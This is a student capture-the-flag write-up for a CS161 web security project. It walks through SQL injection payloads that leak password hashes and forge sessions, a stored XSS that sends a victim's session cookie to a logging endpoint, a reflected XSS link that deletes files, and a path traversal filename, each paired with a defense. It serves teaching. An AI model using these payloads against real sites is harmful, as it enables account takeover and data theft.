## CS161 Project 3 Write-up
### Flag 3: Steal the password hash for user shomil.
#### Exploit location
Insert the exploit into search box of ```https://box.cs161.org/site/list```

#### Exploit
In the backend, when we search for specific files under list files page it runs the following query
```sql
fileName := r.URL.Query()["fileName"][0]
query := fmt.Sprintf("SELECT filename FROM files WHERE filename = '%s'", fileName)
```
We noticed that the above query is vulnerable to SQL Injection and so we insert our exploit
```SQL
' UNION SELECT md5_hash FROM users WHERE username='shomil' --
```
#### Defense: Prepared Statements
```SQL
fileName := r.URL.Query()["fileName"][0]
db := getDB()
row, err := db.QueryRow("SELECT filename FROM files WHERE filename = ?", fileName)
```

### Flag 4: Gain access to nicholas’s account.
#### Exploit location
Insert the exploit into ```session_token``` cookie of application tab of console.
#### Exploit
Everytime we load the page, if the ```session_token``` cookie exists then the server selects and displays the corresponding username with the following query:
```SQL
query := fmt.Sprintf("SELECT username FROM sessions WHERE token = '%s'", token)
```
We noticed that the above query is vulnerable to SQL Injection and so we insert our exploit here
```SQL
' UNION SELECT 'nicholas' FROM sessions --
```
#### Defense: Prepared Statements
```SQL
db := getDB()
row, err := db.QueryRow("SELECT username FROM sessions WHERE token = ?", token)
```

### Flag 5: Leak cs161’s session cookie by pushing it onto the /evil/logs page.
#### Exploit location
Insert the exploit in ```New Filename``` box when renaming an existing file.
#### Exploit
This task is an example of Stored XSS which requires our malicious javascript to be stored in the server. We were able to do this by injecting our exploit as a filename when renaming an existing file. Then, we share that file with cs161 and when they load the list file page, their ```session_token``` is leaked.
```js
<script>fetch('/evil/report?message='+document.cookie)</script>
```
#### Defense: HTML sanitization
With html sanitization, our code would be saved as follows and not be interpreted as javascript.
```js
&lt;script&gt;fetch('/evil/report?message='+document.cookie)&lt;/script&gt;!
```

### Flag 6: Create a link that deletes user’s files. Once you have figured it out, execute the attack on yourself to earn the flag!
### Exploit location
Insert the exploit into search box of ```https://box.cs161.org/site/list```

#### Exploit
This task is an example of Reflected XSS which requires us to build a malicous URL which is reflected in the repsonse. We were able to do this by injecting our javascript in the search box of the file list page.

```
https://box.cs161.org/site/search?term=<script>fetch("https://box.cs161.org/site/deleteFiles",{method:"POST"})</script>
```

#### Defense: CSP
Content Security Policy would disallow inline javascript which prevents this XSS attack since our javascript does not come a trusted domain.

### Flag 7: Gain access to the admin panel.

#### Exploit location
Insert the exploit into search box of ```https://box.cs161.org/site/list```

#### Exploit
We used the same vulnerable query from Flag 3 to learn the username of the admin's regular account
```sql
' UNION SELECT username FROM users --
```

Once the ```username``` was learned, we leaked the ```md5_hash``` of the admin once again using the same vulnerable query
```sql
' UNION SELECT md5_hash FROM users WHERE username='uboxadmin' --
```

Beacuse the md5 hash has been broken, we found an online reverse md5 hash which got us the passowrd to the admin's regular account.
Many people reuse passwords and the admin was no exception.

#### Defense: Prepared Statements
Same defesne from FLAG 3 would have stopped this exploit.
```SQL
fileName := r.URL.Query()["fileName"][0]
db := getDB()
row, err := db.QueryRow("SELECT filename FROM files WHERE filename = ?", fileName)
```

### Flag 8: Gain access to the secrets stored within config.yml.
#### Exploit location
Insert the exploit in ```New Filename``` box when renaming an existing file.

#### Exploit
The ```config.yml``` file was in a folder that we did not have access to. Therefore, we had to carry out a path traversal attack.
This invloved taking adavantage of ../ to go back a directory from the one we had access to. We renamed one of our files as follows:
```
../config/config.yml
```
This gave us access to ```config.yml```

#### Defense: Input Sanitization
A simple defense would be to restrict the use of ```../``` character when renaming a file.